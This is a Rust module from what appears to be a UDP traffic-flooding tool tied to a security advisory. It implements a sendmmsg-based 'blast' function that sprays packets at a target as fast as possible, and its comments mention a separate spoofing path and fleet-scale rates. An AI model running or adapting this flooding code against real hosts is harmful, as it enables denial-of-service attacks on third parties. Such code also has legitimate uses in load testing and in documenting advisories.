//! Linux fast send path: `sendmmsg` batching + enlarged `SO_SNDBUF`.
//!
//! The portable `send_to` path issues one syscall per packet, which caps a core
//! at a few hundred k pps. `sendmmsg` submits a whole batch of datagrams in a
//! single syscall, lifting per-core throughput by 1–2 orders of magnitude — the
//! difference between "enough for one server" and "enough for the fleet"
//! (advisory §8 performance note, §10.2 fleet numbers).
//!
//! Linux-only; the module is `#[cfg]`-compiled out elsewhere. Needs no special
//! privilege (unlike the spoof path).

use std::io;
use std::mem;
use std::net::{SocketAddr, UdpSocket};
use std::os::unix::io::AsRawFd;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

/// Enlarge SO_SNDBUF so short high-rate bursts are less likely to hit ENOBUFS.
pub fn set_sndbuf(sock: &UdpSocket, bytes: i32) {
    let fd = sock.as_raw_fd();
    // Best-effort: the kernel clamps to net.core.wmem_max; ignore failures.
    unsafe {
        libc::setsockopt(
            fd,
            libc::SOL_SOCKET,
            libc::SO_SNDBUF,
            &bytes as *const i32 as *const libc::c_void,
            mem::size_of::<i32>() as libc::socklen_t,
        );
    }
}

/// Build a sockaddr_storage + length from a SocketAddr (v4 or v6).
fn sockaddr_from(target: &SocketAddr) -> (libc::sockaddr_storage, libc::socklen_t) {
    let mut storage: libc::sockaddr_storage = unsafe { mem::zeroed() };
    let len = match target {
        SocketAddr::V4(a) => {
            let sin = &mut storage as *mut _ as *mut libc::sockaddr_in;
            unsafe {
                (*sin).sin_family = libc::AF_INET as libc::sa_family_t;
                (*sin).sin_port = a.port().to_be();
                (*sin).sin_addr.s_addr = u32::from_ne_bytes(a.ip().octets());
            }
            mem::size_of::<libc::sockaddr_in>() as libc::socklen_t
        }
        SocketAddr::V6(a) => {
            let sin6 = &mut storage as *mut _ as *mut libc::sockaddr_in6;
            unsafe {
                (*sin6).sin6_family = libc::AF_INET6 as libc::sa_family_t;
                (*sin6).sin6_port = a.port().to_be();
                (*sin6).sin6_addr.s6_addr = a.ip().octets();
            }
            mem::size_of::<libc::sockaddr_in6>() as libc::socklen_t
        }
    };
    (storage, len)
}

/// Blast `payload` to `target` across `sockets` (round-robin per batch for
/// reuseport spray) via `sendmmsg` until `deadline` or `stop`. Returns the
/// number of packets sent. `per_worker_pps == 0` means uncapped.
pub fn blast(
    sockets: &[UdpSocket],
    payload: &[u8],
    target: SocketAddr,
    deadline: Instant,
    stop: &Arc<AtomicBool>,
    per_worker_pps: u64,
) -> io::Result<u64> {
    const MAX_BATCH: usize = 1024;
    // When paced, keep each batch ~1 ms worth of packets so the rate stays smooth
    // instead of bursting a full 1024 then sleeping.
    let batch = if per_worker_pps == 0 {
        MAX_BATCH
    } else {
        ((per_worker_pps / 1000) as usize).clamp(1, MAX_BATCH)
    };

    let (mut addr, addrlen) = sockaddr_from(&target);
    let mut iov = libc::iovec {
        iov_base: payload.as_ptr() as *mut libc::c_void,
        iov_len: payload.len(),
    };
    // Reusable header array; every message points at the same payload + dest.
    let mut msgs: Vec<libc::mmsghdr> = (0..batch)
        .map(|_| {
            let mut h: libc::mmsghdr = unsafe { mem::zeroed() };
            h.msg_hdr.msg_name = &mut addr as *mut _ as *mut libc::c_void;
            h.msg_hdr.msg_namelen = addrlen;
            h.msg_hdr.msg_iov = &mut iov as *mut libc::iovec;
            h.msg_hdr.msg_iovlen = 1;
            h
        })
        .collect();

    let interval_ns: u64 = if per_worker_pps == 0 { 0 } else { 1_000_000_000 / per_worker_pps };
    let origin = Instant::now();
    let mut slot: u64 = 0;
    let mut idx = 0usize;
    let mut sent: u64 = 0;

    while Instant::now() < deadline && !stop.load(Ordering::Relaxed) {
        let fd = sockets[idx % sockets.len()].as_raw_fd();
        idx = idx.wrapping_add(1);
        let n = unsafe { libc::sendmmsg(fd, msgs.as_mut_ptr(), batch as libc::c_uint, 0) };
        if n < 0 {
            let err = io::Error::last_os_error();
            match err.raw_os_error() {
                // Send buffer momentarily full / interrupted: back off and retry.
                Some(libc::ENOBUFS) | Some(libc::EAGAIN) | Some(libc::EINTR) => {
                    std::thread::sleep(Duration::from_micros(50));
                    continue;
                }
                _ => return Err(err),
            }
        }
        sent += n as u64;
        slot += n as u64;
        if interval_ns > 0 {
            let target_t = origin + Duration::from_nanos(interval_ns.saturating_mul(slot));
            spin_sleep_until(target_t);
        }
    }
    Ok(sent)
}

/// Sleep/spin hybrid until `target` (mirrors pacer.rs so this module is standalone).
fn spin_sleep_until(target: Instant) {
    const SPIN_GUARD: Duration = Duration::from_micros(300);
    loop {
        let now = Instant::now();
        if now >= target {
            return;
        }
        let remaining = target - now;
        if remaining > SPIN_GUARD {
            std::thread::sleep(remaining - SPIN_GUARD);
        } else {
            std::hint::spin_loop();
        }
    }
}
